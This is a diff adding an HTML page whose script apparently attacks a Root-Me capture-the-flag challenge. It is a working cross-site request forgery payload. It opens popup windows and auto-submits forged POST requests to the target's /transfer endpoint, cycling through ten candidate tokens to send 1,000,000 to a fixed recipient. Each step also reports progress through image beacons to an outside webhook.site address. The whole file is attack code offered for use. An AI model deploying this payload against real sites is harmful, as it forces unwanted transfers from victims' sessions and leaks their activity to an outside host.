@@ -1,0 +1,30 @@
+<!DOCTYPE html><html><body><script>
+var toks = ["6a6b502c3225f8c9000000", "6a6b502d3225f8c9000000", "6a6b502e3225f8c9000000", "6a6b502f3225f8c9000000", "6a6b50303225f8c9000000", "6a6b50313225f8c9000000", "6a6b50323225f8c9000000", "6a6b50333225f8c9000000", "6a6b50343225f8c9000000", "6a6b50353225f8c9000000"];
+var BASE = "https://instance-019fb331-4295-70b3-86a1-6c6fdbf50662.challenges.root-me.pro";
+var wh = "https://webhook.site/f5af0355-1e19-423e-8665-14603d26667f?beacon=instr1";
+function beacon(suffix){ var img = document.createElement("img"); img.src = wh + suffix; document.body.appendChild(img); }
+beacon("_start");
+var i = 0;
+function fireNext() {
+  if (i >= toks.length) {
+    beacon("_done");
+    return;
+  }
+  var w = window.open("about:blank", "_blank");
+  if (w) {
+    var f = w.document.createElement("form");
+    f.action = BASE + "/transfer";
+    f.method = "POST";
+    f.innerHTML = "<input name=token value=" + toks[i] + "><input name=recipient value=t5_1785419033><input name=amount value=1000000>";
+    w.document.body.appendChild(f);
+    f.submit();
+    setTimeout(function(win){ try { win.close(); } catch(e){} }, 400, w);
+  } else {
+    beacon("_popupblocked");
+  }
+  beacon("_i" + i);
+  i++;
+  setTimeout(fireNext, 150);
+}
+fireNext();
+</script></body></html>
